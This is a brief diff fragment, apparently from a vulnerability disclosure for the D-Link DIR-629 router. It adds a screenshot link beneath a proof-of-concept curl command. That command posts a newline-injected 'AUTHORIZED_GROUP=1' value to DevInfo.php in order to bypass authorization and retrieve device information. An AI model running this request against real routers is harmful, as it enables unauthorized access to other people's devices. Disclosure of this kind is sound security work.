@@ -33,3 +33,4 @@ POC:
 ```
 curl http://[ip]:[port]/DevInfo.php -d "aaa=%0aAUTHORIZED_GROUP=1"
 ```
+![getinfo](https://github.com/Cyc1eC/D-Link/blob/master/DIR-629/getinfo.png)
